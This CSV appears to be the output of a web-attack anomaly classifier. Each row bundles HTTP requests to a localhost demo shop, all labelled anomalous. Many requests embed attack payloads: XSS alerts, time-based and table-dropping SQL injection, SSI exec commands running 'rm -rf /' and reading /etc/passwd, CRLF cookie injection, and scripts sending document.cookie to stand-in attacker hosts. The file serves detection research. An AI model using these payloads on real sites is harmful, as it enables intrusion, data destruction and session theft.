data,y_pred,y_test
"posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e&login=zeigler&pwd=7ervant0f2la&remember=off&b1=entrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=maijala&pwd=<!--#include+file=""archivo_secreto""+-->&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=','0','0','0','0');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/asf-logo-wide.gif/.old posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=suxin&password=testificaci�n&nombre=brisa&apellidos=corado+bon�as&email=mrkvicka@tvup.au&dni=27353775j&direccion=rio+pisue�a,+164,+12a&ciudad=caudiel&cp=17220&provincia=/zamora&ntc=1754652645493707&b1=registrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+--> posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombrea=queso+manchego&precio=85&cantidad=55&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=365&b1=pasar+por+caja/ posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=perkins','0','0','0','0');waitfor+delay+'0:0:15';--&pwd=7ad524z&remember=off&b1=entrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dody&password=rizof�reo&nombre=landelina&apellidos=bignes+arriaza&email=cassagna@eurograb.tw&dni=97817638h&direccion=calle+ferrallista+33*+,+&ciudad=campillos-sierra&cp=44145&provincia=lugo&ntc=1198533342544918&b1=registrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=befanis&pwd=pisonear&remember=off&b1=entrar%7c gethttp://localhost:8080/tienda1/miembros/asf-logo-wide posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=2293&b1=pasar+por+caja posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=','0','0','0','0');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=""><!--#exec+cmd=""dir+""-->< posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=roig&pwd=verecunda&remember=on/&b1=entrar gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito@40 gethttp://localhost:8080/tienda1/publico/productos.jsp/asf-logo-wide.gif gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas%20",anomalous,anomalous
"gethttp://localhost:8080.inc gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=catlin&pwd=v76c088ra&remember=off&b1=entrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=rasmira&apellidos=pavi�+pool&email=gloves@sms24h.mk&dni=92795576y&direccion=c/+venus,++60,+&ciudad=ger&cp=24370&provincia=cantabria&ntc=7563981891605435&b1=registrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=joannidi&pwda=mis9tura&remember=off&b1=entrar posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas','0');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=perceval&password=0er,0lle31&nombre=parmenio&apellidos=d'molino+bocas&email=jay@almascanarias.wf&dni=96398598d&direccion=lepant+33,+&ciudad=benuza&cp=26560&provincia=guadalajara&ntc=2171179152751946&b1=registrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=nafsika&password=malhecho&nombre=jesumina&apellidos=-p-i�a,na&email=cottrell@muchochinoenchina.tg&dni=44709161j&direccion=navaluenga,+120+11?a&ciudad=or�soain&cp=21840&provincia=cuenca&ntc=4344385269362154&b1=registrar posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg='or'a='a gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=85/&cantidad=3&b1=a�adir+al+carrito gethttp://localhost:8080/iissamples/sdk/asp/database/limitrows_vbscript.asp",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=evey8&password=87sacar&nombre=faustino&apellidos=marti+maragliano&email=almassy@schnapps.com.vg&dni=31454031j&direccion=c/+luis+alvarez+lencero,+78+8-b&ciudad=fresno+de+rodilla&cp=12292&provincia=le�n&ntca=6284462739974610&b1=registrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727&nombre=vino+rioja&precio=85&cantidad=63&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=washburn&pwd=2e822ad4r8&remember=on&b1=entrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=yingcdi&password=pisa-verde&nombre=vianella&apellidos=galdeano+piccech&email=dudgeon@tradora.na&dni=80818838n&direccion=c/+can+petit+42,+10-f&ciudada=gormaz&cp=32737&provincia=zaragoza&ntc=0673547824413217&b1=registrar gethttp://localhost:8080/tienda1/global/estilos.css/asf-logo-wide gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1','0');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/publico/entrar.jsp.inc gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shein&password=e1bo5c62&nombre=alexia&apellidos=lorente+vairo&email=gozier@callalelaboca.bz&dni=48475570b&direccion=joncar+23,+&ciudad=villa+verde+de+*+medina&cp=45525&provincia=madrid&ntc=2914128160766490&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=antonin&password=suplidora&nombre=calixto&apellidos=giorgis+zabala&email=merry@mcrspain.gg&dni=23625046k&direccion=pla�a+manuel+corachan+s/n,+9a&ciudad=coscurita&cp=08696paros%22%20style=%22background:url(javascript:alert('paros'))&provincia=lleida&ntc=1573270411029963&b1=registrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=emiline&password=desplataci�n&nombrea=helvecia&apellidos=santini+iennaco&email=mello@supercover.so&dni=00041295x&direccion=plaza+republica+argentina,+147,+9f&ciudad=megina&cp=10392&provincia=�vila&ntc=6829441346595733&b1=registrar",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombrea=vino+rioja&precio=39&cantidad=70&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/miembros/editar.jsp?modoa=registro&login=arne&password=arenilla&nombre=malaqu�as&apellidos=bota+gifre&email=herdegen-vehil@cortinas-de-aire.ar&dni=38384259l&direccion=c/+sabugo,+157,+&ciudad=valdevacas+de+montejo&cp=26339&provincia=tarragona&ntc=6852146150685245&b1=registrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+rioja&precio=39&cantidad=41&b1a=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cathal&password=ce/re_b56l&nombre=apeles&apellidos=capafons+melgarejo&email=crane7@privatebanking.com.nc&dni=80723845d&direccion=c/+doctor+sanchez+cozar,+88,+&ciudad=herrera,+la&cp=24100&provincia=lleida&ntc=9690651027798587&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sherri&password=adj9d8cat0r55&nombre=bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org&apellidos=gilabert&email=chimento@fuzzy.bb&dni=66365789w&direccion=plaza+doctor+quemada+88+8-h&ciudad=castrocalb�n&cp=19268&provincia=asturias&ntc=3607118257162367&b1=registrar gethttp://localhost:8080/tienda1/publico/6909030637832563290.jsp.bak gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=lefebvre&pwd=s6g4a9184&remember=off&b1=entrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=paxton&password=e4te9ada&nombre=hermelinda&apellidos=llorente+batllori&email=kawazu3@alquilerpantallasled.org&dni=79540644c&direccion=cami�o+dentagron+68,+&ciudad=san+mart�n+del+r�o&cpa=33909&provincia=teruel&ntc=3393638948319901&b1=registrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tres-sup&pwd=qui4erear&remember=onbob@<script>alert(paros)</script>.parosproxy.org&b1=entrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%00",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=<script>alert(""paros"");</script>&nombre=jam�n+ib�rico&precio=85&cantidad=80&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1+ posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kessiah&passworda=balc�nico&nombre=ruth&apellidos=burch+echaniz&email=gandett@cajucar.az&dni=77572920s&direccion=pl.+eduardo+chillida,+40+&ciudad=sanxenxo&cp=17161&provincia=zamora&ntc=2803074671836038&b1=registrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?&password=tel�grafo&nombre=alexia&apellidos=de+castro+w�lker&email=jans@voragolive.do&dni=63653644v&direccion=sanlucar+la+mayor,+148,+&ciudad=atzeneta+del+maestrat&cp=16270&provincia=ciudad+real&ntc=5906206602610899&b1=registrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=doro&pwda=!filatelia&remember=off&b1=entrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=correa&passworda=5ortera&nombre=fructuosa&apellidos=polloni+homdedeu&email=berto@sindualidad.dd&dni=49742539w&direccion=c/+einstein,+147,+9?a&ciudad=legazpi&cp=44349&provincia=valencia&ntc=2169388539628734&b1=registrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%20 gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=2293&b1=pasar+por+caja gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide~ gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=39&cantidad=75&b1=a�adir+al+carritoparos%22%20style=%22background:url(javascript:alert('paros'))",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=473&b1=pasar+por+caja/ gethttp://localhost:8080/tienda1/global/titulo.jsp/6909030637832563290.jsp gethttp://localhost:8080/tienda1/imagenes/asf-logo-wide posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5716&b1=pasar+por+caja/ posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=raymund&pwd=pist�n&remember=on&b1=%3f gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1""><!--#exec+cmd=""dir+""-->< posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito%2b posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasset-cookie%3a+tamper%3d1041264011025374727 posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=calow&pwd=ensa�ada&remember=off/&b1=entrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9499&b1=confirmar/",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectassessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script> posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4641&b1=confirmar/ gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bao&password=val�&nombre=norberta&apellidos=poller+saravia&email=kolesar5@ratzapper.cl&dni=12690729l&direccion=c/+valls+30,+10-f&ciudad=luciana&cp=02316&provincia=""+and+""1""=""1&ntc=0204088681426033&b1=registrar gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=paros%22+style%3d%22background%3aurl%28javascript%3aalert%28%27paros%27%29%29&id=2 gethttp://localhost:8080/tienda1/global/estilos.css/asf-logo-wide gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4708&b1=pasar+por+caja/ posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=maciejew&pwd=de!senmara�ar&remember=on&b1=entrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7041&b1=pasar+por+caja/ gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lollis&pwd=s'/ab/a��n&remember=off&b1=entrar gethttp://localhost:8080/tienda1/asf-logo-wide.gif/",anomalous,anomalous
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rourke&password=d.iclino&nombre=yulisa','0');waitfor+delay+'0:0:15';--&apellidos=atondo+kan&email=oak@cpanelhost.com.be&dni=29170567n&direccion=c/+driza,+63+11-d&ciudad=fuensalda�a&cp=02461&provincia=�vila&ntc=6074458836046165&b1=registrar gethttp://localhost:8080/tienda1/miembros/index.jsp.inc posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nettle&password=he�ir&nombre=rad&apellidos=zalarich+llufriu&email=duarte@ingenieriadelaconstruccion.vc&dni=47182191z&direccion=baza,+55,+&ciudad=y/e++sa&cp=43151&provincia=granada&ntc=8375962445368254&b1=registrar gethttp://localhost:8080/tienda1/publico/productos.jsp.old posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ambrosio&password=t?ub0lo6o&nombre=adonay&apellidos=castillero+minguez&emaila=gamble@viajesinternacionales.as&dni=73982596z&direccion=c/+isabel+fornieles,+168+5e&ciudad=vid+de+ojeda,+la&cp=02639&provincia=m�laga&ntc=4663857286858703&b1=registrar gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org gethttp://localhost:8080/tienda1/miembros/asf-logo-wide.gif/.bak gethttp://localhost:8080.inc gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&logina=scalabri&password=carnaz�9&nombre=almando&apellidos=blasi&email=caba.colley@grandesinventos.mil&dni=67014940r&direccion=mariucha,+133,+11e&ciudad=foradada&cp=16800&provincia=c�rdoba&ntc=1771682809315400&b1=registrar gethttp://localhost:8080/scripts/tools/drvrs.exe",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=5029&b1=pasar+por+caja gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=5151&b1=confirmar puthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cicci&pwd=plasmador&remember=on&b1=entrar gethttp://localhost:8080/tienda1/imagenes/3.gif.old gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wendy&password=a-h�lo&nombre=edelvais&apellidos=alba�il+comasoli&email=raidhi_altermen@prestamosypersonales.kw&dni=68675744k&direccion=puerto+de+canfranc+179,+&ciudad=mont�n&cp=12415&provinciaa=guadalajara&ntc=8960280484576559&b1=registrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=levasseu&password=embarbillado&nombre=zuleika&apellidos=pe�azco+arreche&email=others@tetdevelocidad.sz&dni=91212440y&direccion=c/+mostoles+25,+2c&ciudad=amposta&cp=1812a&provincia=valencia&ntc=1675356603176027&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=843&b1=pasar+por+caja gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jovo&password=/'t�trico&nombre=hebelen&apellidos=fornalino+grimaldi&email=ozaki_wanamaker@travelzone.tel&dni=75981771y&direccion=calle+san+juan+bautista+de+la+salle+193+6?c&ciudad=calatorao&cp=10191&provincia=burgos&ntc=3393638948319901&b1=registrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=vino+rioja&precio=85&cantidad=80&b1=a�adir+al+carrito",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=85&cantidad=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=100/&cantidad=61&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gonzaga&password=acontecimiento&nombre=redenta&apellidos=libano+parramon&email=vigran@maletti.cy&dni=24320656l&direccion=calle+tagarnina,+120,+13c&ciudad=tor..m*os&cp=10748&provincia=castell�n&ntc=6815796601581594&b1=registrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=montijo&passworda=mane79&nombre=lihuen&apellidos=bibiloni+urdi&email=brion@baybay.gi&dni=00508069e&direccion=gerona+89+&ciudad=olocau+del+rey&cp=16122&provincia=valladolid&ntc=2304911329453006&b1=registrar gethttp://localhost:8080/tienda1/6909030637832563290.jsp.old posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registrobob@<script>alert(paros)</script>.parosproxy.org&login=romani&password=colonizador&nombre=zarruf&apellidos=ledesma+pall�s&email=cherrill@hotelestopsecret.ba&dni=20317452b&direccion=bajada+san+martin,+196,+13?f&ciudad=santa+br�gida&cp=08697&provincia=m�laga&ntc=4580707796997762&b1=registrar gethttp://localhost:8080/samples/dbsamp/dbsamp2.htm posthttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=2949&b1=pasar+por+caja posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=semmens&pwd=5872ra&remember=off&b1=entrar gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=clarence&password=varona&nombre=arnulfo&apellidos=aniceto+lacunza&email=polk@tintaultravioleta.mx&dni=52722813m&direccion=ca+lle++murcia,+72,+*10?a&ciudad=ribes+de+freser&cp=16122&provincia=valencia&ntc=8960498379744557&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=erdem&password=verd7ma3&nombre=zinedine&apellidos=terzano+revert�&email=%7c&dni=58018464k&direccion=c/+alondra,+134,+10?c&ciudad=pu�rtolas&cp=33070&provincia=guadalajara&ntc=4378749164701036&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9043&b1=any%0d%0aset-cookie%3a+tamper%3d5765205567234876235 gethttp://localhost:8080/tienda1/publico/pagar.jsp/4861362529278789730 posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombrea=vino+rioja&precio=39&cantidad=75&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombrea=jam�n+ib�rico&precio=39&cantidad=4&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precioa=100&cantidad=7&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hatti&password=vituperador&nombre=guiliano&apellidos=c�mara+dovale&email=tiensuwan@zarasalud.py&dni=84598781c&direccion=p+la�a+joan+corrades+i+bo+sch,+8*4,+&ciudad=lloar,+el&cp=24170&provincia=valladolid&ntc=4582509168680893&b1=registrar posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n'+ib�ric-'o&precio=39&cantidad=40&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=katzenel&password=+&nombre=yenina&apellidos=cat�+viera&email=mabuchi-britts@portaldesign.tj&dni=72130723d&direccion=c/+los+sauces,+87+&ciudad=albag�s,+l'&cp=31220&provincia=segovia&ntc=8743026490183484&b1=registrar gethttp://localhost:8080/tienda1/publico.java posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mile&pwd=des9i852d268%3f&remember=off&b1=entrar gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=<!--#exec+cmd=""ls+/""-->&login=crowder&pwd=6.en0e6at2da&remember=on&b1=entrar gethttp://localhost:8080/tienda1/imagenes/1.gif/4861362529278789730~ gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/miembros/editar.jsp.inc gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=iwona&pwd=pantorrilluda&remembera=off&b1=entrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=""+and+""1""=""1 gethttp://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.gif",anomalous,anomalous
"gethttp://localhost:8080/tienda1/imagenes/2.gif/~ puthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=suh9&pwda=4ar9ues4a&remember=off&b1=entrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombrea=queso+manchego&precio=39&cantidad=86&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico.inc posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9671&b1=""><!--#exec+cmd=""dir+""-->< posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script> gethttp://localhost:8080/asf-logo-wide posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=carolyne&password=1�5i7am41t0&nombre=ram�n&apellidos=chambueta+deben&email=<script>alert(""paros"");</script>&dni=10042805q&direccion=calle+falconera,+173+&ciudad=trefacio&cp=31227&provincia=salamanca&ntc=1976494121699035&b1=registrar gethttp://localhost:8080/tienda1/publico/carrito.jsp/asf-logo-wide",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yank&password=tr4n52r&nombre=ferreol&apellidos=vilamitj�+ponce&email=devlin_lazar@joyaseleccion.tk&dni=93119033z&direccion=calle+marques+de+pontejos+170+&ciudad=molar,+el&cp=44721bob@<script>alert(paros)</script>.parosproxy.org&provincia=badajoz&ntc=5418660256451813&b1=registrar gethttp://localhost:8080/tienda1/asf-logo-wide.gif posthttp://localhost:8080/tienda1/miembros/editar.jsp?modoa=registro&login=fallows&password=hidrost�t.ica&nombre=florentin&apellidos=diosdado+pi�eiro&email=jones-davis@cincocolores.cf&dni=68096192t&direccion=calle+san+sebastian+38,+&ciudad=hontecillas&cp=09292&provincia=burgos&ntc=7245939027120885&b1=registrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=buzzy&pwd=impr37e4197d9&remember=off/&b1=entrar gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=honda&passworda=d.o4a56�n&nombre=josua&apellidos=negrete&email=haworth@rockefeller.uk&dni=32230670b&direccion=calle+pura+e+dora+vazquez+12,+7d&ciudad=padul&cp=19307&provincia=almer�a&ntc=9549023942251189&b1=registrar posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/asf-logo-wide.gif/ posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=heurich3&password=afici�n&nombre=rendor&apellidos=hosta+ba�uls&email=gisladottir@ingenieriadelaconstruccion.bh&dni=17217664w&direcciona=calle+suiza+s/n+10g&ciudad=calzadilla+de+los+barros&cp=34757&provincia=badajoz&ntc=3373998516659876&b1=registrar posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=/dame?na&password=trufaldina&nombre=yadia&apellidos=puerta+garreta&email=fleur@drae2.kh&dni=52864416c&direccion=parque+de+despe�aperros,+159+&ciudad=algerri&cp=47175&provincia=zaragoza&ntc=9535422521832781&b1=registrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kapil&password=d1c36o4ca&nombre=berina+del+valle&apellidos=artico&email=meunier.langa@tintasultravioleta.al&dni=17826694s&direccion=c/+historiador+rodrigo+pertegas,+149,+8-e&ciudad=palafolls','0','0','0','0');waitfor+delay+'0:0:15';--&cp=25218&provincia=c�ceres&ntc=3256313581077416&b1=registrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=jam�n+ib�rico&precio=85&cantidad=23&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=6536&b1=confirmar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=huntlee&password=da.mer�a&nombre=abundio&apellidos=vendrells+unda&email=goetz-pongnati@itrends.tt&dni=80216747s&direccion=calle+francisco+de+diego,+83+1-h&ciudad=moeche&cp=04897&provincia=valladolid&ntc=714689639778546a&b1=registrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=100&cantidad=47&b1a=a�adir+al+carrito gethttp://localhost:8080.bak gethttp://localhost:8080/tienda1/publico/anadir.jsp?ida=1&nombre=vino+rioja&precio=85&cantidad=48&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=9857&b1=pasar+por+caja gethttp://localhost:8080/exampleswebapp/sessionservlet posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=calley&password=postifijo&nombre=naiara&apellidos=baldo+urra&email=wildhagen_cavender@hotelestopsecret.kp&dnia=91334515c&direccion=calle+en+corts+130,+2?a&ciudad=jaul�n&cp=04280&provincia=�vila&ntc=4540479003454435&b1=registrar",anomalous,anomalous
